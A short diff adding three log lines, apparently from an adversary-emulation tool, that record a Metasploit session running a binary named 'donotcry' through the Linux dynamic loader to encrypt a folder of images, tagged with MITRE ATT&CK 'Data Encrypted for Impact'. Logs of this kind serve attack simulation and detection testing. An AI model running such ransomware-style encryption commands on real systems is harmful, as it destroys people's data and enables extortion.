@@ -1,0 +1,3 @@
+2025-12-12 10:47:34 INFO - Executing Msf-Session-Command: '/lib64/ld-linux-x86-64.so.2 /opt/donotcry encrypt /media/data/Images'
+2025-12-12 10:47:34 INFO - Metadata: {"techniques": "T1486,T1565.001", "tactics": "Impact", "technique_name": "Data Encrypted for Impact, Data Manipulation: Stored Data Manipulation"}
+2025-12-12 10:47:34 INFO - Executing a msf-command
